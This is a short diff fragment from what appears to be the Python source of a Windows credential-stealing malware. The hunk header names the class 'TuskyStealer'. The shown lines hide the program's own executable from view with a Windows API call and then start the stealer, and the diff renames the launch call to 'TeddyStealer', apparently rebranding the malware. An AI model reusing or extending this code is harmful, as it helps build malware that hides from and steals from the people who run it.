@@ -187,4 +187,4 @@ class TuskyStealer(functions):
 if __name__ == "__main__" and os.name == 'nt':
     if config.get('hide_self'):
         ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
-    TuskyStealer()
+    TeddyStealer()
